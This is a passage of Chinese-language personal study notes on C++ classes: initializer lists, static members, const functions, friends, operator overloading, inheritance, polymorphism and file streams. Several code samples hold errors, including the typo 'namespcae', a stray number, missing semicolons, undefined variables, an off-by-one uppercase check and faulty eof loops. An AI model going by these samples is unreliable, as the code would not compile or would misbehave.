class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span><br>&#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> m_A;        <br>    <span class="hljs-type">int</span> m_B;        <br>    <span class="hljs-type">int</span> m_C;<br>    <span class="hljs-comment">//传统初始化操作</span><br>    <span class="hljs-built_in">Person</span>(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> c)<br>    &#123;<br>        m_A=a;<br>        m_B=b;<br>        m_C=c;<br><br>    &#125;    <br>    <span class="hljs-comment">//初始化列表</span><br><span class="hljs-built_in">Person</span>(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> c):<span class="hljs-built_in">m_A</span>(a),<span class="hljs-built_in">m_B</span>(b),<span class="hljs-built_in">m_C</span>(c)&#123;&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">Person</span>(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>);<span class="hljs-number">78</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="静态成员"><a href="#静态成员" class="headerlink" title="静态成员"></a>静态成员</h1><h2 id="静态成员变量"><a href="#静态成员变量" class="headerlink" title="静态成员变量"></a>静态成员变量</h2><ol>      <li>所有对象都共享一份数据</li><li>编译阶段就分配内存</li><li>类内声明，类外初始化操作</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> m_A;<br>&#125;<br><span class="hljs-type">int</span> Person::m_A=<span class="hljs-number">100</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    Person p1;<br>    cout&lt;&lt;p.m_A&lt;&lt;endl;<br>    Person p2;<br>    cout&lt;&lt;p.m_A&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问方式</p><ol><li>通过对象访问:   p1.m_A</li><li>通过类名访问:  Person::m_A</li></ol><blockquote><p>注：静态成员变量也有访问权限的，如果是私有权限在类外也是无法访问的</p></blockquote><h2 id="静态成员函数"><a href="#静态成员函数" class="headerlink" title="静态成员函数"></a>静态成员函数</h2><ol><li><p>所有对象都共享一个函数</p></li><li><p>静态成员函数<em><strong>只能访问静态成员变量</strong></em></p><p>访问方式与静态成员变量一样</p></li></ol><blockquote><p>因为当访问非静态成员变量时，无法辨别出是哪个对象的成员变量，所以无法访问</p></blockquote><h1 id="const修饰成员函数"><a href="#const修饰成员函数" class="headerlink" title="const修饰成员函数"></a>const修饰成员函数</h1><h2 id="常函数"><a href="#常函数" class="headerlink" title="常函数"></a>常函数</h2><ul><li>成员函数在加上const后我们称这个函数为常函数</li><li>常函数不可以修改成员属性</li><li>成员属性声明时加关键字mutable，在常函数中可以修改</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span><br>&#123;<br>    <span class="hljs-type">int</span> a;<br>    <span class="hljs-keyword">mutable</span> <span class="hljs-type">int</span> b;<span class="hljs-comment">//可以修改</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function"><span class="hljs-comment">//加上const修饰的是this指向，让指针指向的值不可以修改</span></span><br><span class="hljs-function">  </span>&#123;<br>      ……<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="常对象"><a href="#常对象" class="headerlink" title="常对象"></a>常对象</h2><ul><li>声明对象前加上const称为常对象</li><li>常对象只能调用常函数</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">const</span> Person p;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="友元"><a href="#友元" class="headerlink" title="友元"></a>友元</h1><h2 id="全局函数做友元"><a href="#全局函数做友元" class="headerlink" title="全局函数做友元"></a>全局函数做友元</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">building</span><br>&#123;<br><span class="hljs-function"><span class="hljs-keyword">friend</span> <span class="hljs-type">void</span> <span class="hljs-title">frn</span><span class="hljs-params">(building* build)</span></span>;<span class="hljs-comment">//将全局函数添加友元    </span><br><span class="hljs-keyword">public</span>:<br>    string m_Sroom;<br>     <span class="hljs-built_in">building</span>()<br>    &#123;<br>        m_Sroom = <span class="hljs-string">&quot;客厅&quot;</span>;<br>        m_Broom = <span class="hljs-string">&quot;卧室&quot;</span>;<br>    &#125;<br><span class="hljs-keyword">private</span>:<br>    string m_Broom;<br>  <br>&#125;;<br><span class="hljs-comment">//全局函数</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">frn</span><span class="hljs-params">(building *build)</span> </span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;friend：&quot;</span> &lt;&lt; build-&gt;m_Sroom &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;friend：&quot;</span> &lt;&lt; build-&gt;m_Broom &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    building build1;<br>    <span class="hljs-built_in">frn</span>(&amp;build1);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">test</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="友元类"><a href="#友元类" class="headerlink" title="友元类"></a>友元类</h2><p>已实现一个类可以访问另一个类中的私有成员</p><blockquote><p>这段代码同时练习了在类外写成员函数</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">building</span>;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">fren</span><br>&#123;<br>  <br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">visit</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">//访问building中属性</span><br>    building* build;<br>    <span class="hljs-built_in">fren</span>();<span class="hljs-comment">//类外实现</span><br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">building</span><br>&#123;<br><span class="hljs-keyword">friend</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fren</span>;<br><span class="hljs-keyword">public</span>:<br>    string m_Sroom;<br>    <span class="hljs-built_in">building</span>();<span class="hljs-comment">//类外写成员函数</span><br><br><span class="hljs-keyword">private</span>:<br>    string m_Broom;<br><br>&#125;;<br>building::<span class="hljs-built_in">building</span>()<span class="hljs-comment">//构造函数，要加building作用域</span><br>&#123;<br>    m_Sroom = <span class="hljs-string">&quot;客厅&quot;</span>;<br>    m_Broom = <span class="hljs-string">&quot;卧室&quot;</span>;<br>&#125;<br>fren::<span class="hljs-built_in">fren</span>()<span class="hljs-comment">//构造函数</span><br>&#123;<br>    <span class="hljs-comment">//创建一个建筑物</span><br>  build = <span class="hljs-keyword">new</span> building;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">fren::visit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;friend：&quot;</span> &lt;&lt; build-&gt;m_Sroom &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;friend：&quot;</span> &lt;&lt; build-&gt;m_Broom &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    fren frn;<br>    frn.<span class="hljs-built_in">visit</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">test</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h1><h2 id="加号运算符重载"><a href="#加号运算符重载" class="headerlink" title="加号运算符重载"></a>加号运算符重载</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> namespcae std;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span> <br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> m_age;<br><span class="hljs-type">int</span> m_height;<br>person <span class="hljs-keyword">operator</span>+( person&amp; n)<span class="hljs-comment">//通过成员函数重载</span><br>&#123;<br>person temp;<br>temp.m_age=<span class="hljs-keyword">this</span>-&gt;m_age + n.m_age;<br>temp.m_height =<span class="hljs-keyword">this</span>-&gt;m_height+ n.m_height;<br><span class="hljs-keyword">return</span> temp;<br>&#125;<br>&#125;;<br><span class="hljs-comment">//利用全局函数重载</span><br><span class="hljs-comment">/*person operator+(person &amp;m,person&amp; n)</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">person temp;</span><br><span class="hljs-comment">temp.m_age = m.m_age + n.m_age;</span><br><span class="hljs-comment">temp.m_height = m.m_height + n.m_height;</span><br><span class="hljs-comment">return temp;</span><br><span class="hljs-comment">&#125;*/</span><br>person <span class="hljs-keyword">operator</span>+(person&amp; m, <span class="hljs-type">int</span> num)<span class="hljs-comment">//运算符重载实现函数重载</span><br>&#123;<br>person temp;<br>temp.m_age = m.m_age + num;<br>temp.m_height = m.m_height +num;<br><span class="hljs-keyword">return</span> temp;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>person p1 = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;;<br>person p2 = &#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br>person p3 = p1 + p2;<br>    person p4 = p1 + <span class="hljs-number">3</span>;<br>    <span class="hljs-comment">//此处利用加号重载实现两个类的加和</span><br><span class="hljs-comment">//当利用的是成员函数重载时原型为：person p3=p1.operator(p2);   简化为person p3=p1+p2</span><br><span class="hljs-comment">//当利用的是全局函数重载时原型为：person p3=operator(p1,p2);   简化为person p3=p1+p2</span><br>    cout &lt;&lt; <span class="hljs-string">&quot;age\t&quot;</span> &lt;&lt; p<span class="hljs-number">3.</span>m_age &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;height\t&quot;</span> &lt;&lt; p<span class="hljs-number">3.</span>m_height &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;age\t&quot;</span> &lt;&lt; p<span class="hljs-number">4.</span>m_age &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;height\t&quot;</span> &lt;&lt; p<span class="hljs-number">4.</span>m_height &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">test</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="左移运算符重载"><a href="#左移运算符重载" class="headerlink" title="左移运算符重载"></a>左移运算符重载</h2><p>一般不用成员函数来重载&lt;&lt;，因为如果调用的话原型为<code>p.operator&lt;&lt;(cout)</code>简化为<code>p&lt;&lt;cout</code>与原本相反</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++">ostream &amp; <span class="hljs-keyword">operator</span>&lt;&lt;(ostream &amp;out,<span class="hljs-type">const</span> person&amp; n)<span class="hljs-comment">//全局函数实现将类中的成员全部打印</span><br>&#123;<br>out &lt;&lt;<span class="hljs-string">&quot;年龄\t&quot;</span> &lt;&lt; n.m_age&lt;&lt;<span class="hljs-string">&quot;身高\t&quot;</span> &lt;&lt; n.m_height &lt;&lt; endl;<br><br><span class="hljs-keyword">return</span> out;<br>&#125;<br>istream &amp;<span class="hljs-keyword">operator</span>&gt;&gt;(istream &amp;in, Course&amp; c)<span class="hljs-comment">//注意此处不是const否则无法输入</span><br>&#123;<br>in &gt;&gt; c.name;<br>in &gt;&gt; c.number;<br><span class="hljs-keyword">return</span> in;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><p><img src="D:\HEXO\hexo-blog\source_posts\C-学习\继承方式.png" alt="继承方式"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">base</span><br>&#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> a;<br>    <span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">int</span> b;<br>    <span class="hljs-keyword">protected</span>:<br>    <span class="hljs-type">int</span> c;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son</span>:<span class="hljs-keyword">public</span> base<br>&#123;<br>    ……<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="继承的对象模型"><a href="#继承的对象模型" class="headerlink" title="继承的对象模型"></a>继承的对象模型</h2><p><strong>在父类中的非静态成员属性子类都会继承下去</strong></p><p>利用开发者命令符查看对象模型：</p><p>vs开发者人员命令提示符——&gt;切换至项目的地址——&gt;可以先dir查看该地址下的文件中是否存在目标项目——&gt;输入命令<code>cl /d1 reportSingleClassLatout+想查看的类名(无空格)+文件名</code></p><h2 id="同名成员，同名静态成员的处理"><a href="#同名成员，同名静态成员的处理" class="headerlink" title="同名成员，同名静态成员的处理"></a>同名成员，同名静态成员的处理</h2><ul><li>当想访问子类同名成员——直接访问即可</li><li>访问父类同名成员时——加作用域</li></ul><h2 id="菱形继承"><a href="#菱形继承" class="headerlink" title="菱形继承"></a>菱形继承</h2><p>菱形继承会导致数据有两份，导致资源浪费</p><p>利用虚继承解决菱形继承问题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">base</span><br>&#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> a;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:<span class="hljs-keyword">virtual</span> <span class="hljs-keyword">public</span> base<span class="hljs-comment">//添加关键字virtual实现虚继承</span><br>&#123;<br><br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>:<span class="hljs-keyword">virtual</span> <span class="hljs-keyword">public</span> base<br>&#123;<br><br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span>:<span class="hljs-keyword">virtual</span> <span class="hljs-keyword">public</span> A,<span class="hljs-keyword">public</span> B<br>&#123;<br>    <br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span> <span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    C m;<br>    m.A::a=<span class="hljs-number">1</span>;<br>    m.B::a=<span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="D:\HEXO\hexo-blog\source_posts\C-学习\虚继承.png" alt="虚继承"></p><p><img src="D:\HEXO\hexo-blog\source_posts\C-学习\菱形继承.png" alt="菱形继承造成的资源浪费"></p><h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><p>条件：</p><ul><li>有继承关系</li><li>子类要<strong>重写</strong>父类虚函数</li></ul><p>使用：</p><ul><li>父类的指针或引用 执行子类对象</li></ul><p>eg :</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">animal</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;动物&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cat</span> : <span class="hljs-keyword">public</span> animal <br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;小猫&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">dog</span> : <span class="hljs-keyword">public</span> animal <br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;小狗&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Soud</span><span class="hljs-params">(animal &amp;animal)</span></span><br><span class="hljs-function"></span>&#123;<br>animal.<span class="hljs-built_in">speak</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cat cat1;<br><span class="hljs-built_in">Soud</span>(cat1);<br>dog dog1;<br><span class="hljs-built_in">Soud</span>(dog1);<br><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">test</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fstream&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ReadFile</span><span class="hljs-params">(string s)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">ifstream <span class="hljs-title">f</span><span class="hljs-params">(s)</span></span>;<br><span class="hljs-keyword">if</span> (!f) &#123;<br>cerr &lt;&lt; <span class="hljs-string">&quot;Error opening file: &quot;</span> &lt;&lt; s &lt;&lt; endl;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">char</span> ch;<br><span class="hljs-keyword">while</span> (!f.<span class="hljs-built_in">eof</span>())<br>&#123;<br>f.<span class="hljs-built_in">get</span>(ch);<br>cout &lt;&lt; ch;<br>&#125;<br>f.<span class="hljs-built_in">close</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Change</span><span class="hljs-params">(string s1, string s2)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">ifstream <span class="hljs-title">ifile</span><span class="hljs-params">(s1)</span></span>;<br><span class="hljs-function">ofstream <span class="hljs-title">ofile</span><span class="hljs-params">(s2)</span></span>;<br><span class="hljs-keyword">if</span> (!ifile) &#123;<br>cerr &lt;&lt; <span class="hljs-string">&quot;Error opening file: &quot;</span> &lt;&lt; s1 &lt;&lt; endl;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (!ofile) &#123;<br>cerr &lt;&lt; <span class="hljs-string">&quot;Error opening file: &quot;</span> &lt;&lt; s2 &lt;&lt; endl;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">char</span> ch;<br><span class="hljs-keyword">while</span> (!ifile.<span class="hljs-built_in">eof</span>())<br>&#123;<br>ifile.<span class="hljs-built_in">get</span>(ch);<br><span class="hljs-keyword">if</span> (ch &gt; <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; ch &lt; <span class="hljs-string">&#x27;Z&#x27;</span>)<br>&#123;<br>ch += <span class="hljs-number">32</span>;<br>&#125;<br>ofile.<span class="hljs-built_in">put</span>(ch);<br>&#125;<br>ifile.<span class="hljs-built_in">close</span>();<br>ofile.<span class="hljs-built_in">close</span>();<br><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">ReadFile</span>(<span class="hljs-string">&quot;d:/B24041718/ff.txt&quot;</span>);<br><span class="hljs-built_in">Change</span>(<span class="hljs-string">&quot;d:/B24041718/ff.txt&quot;</span>, <span class="hljs-string">&quot;d:/B24041718/ff2.txt&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h1><p>数组</p><p>使用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 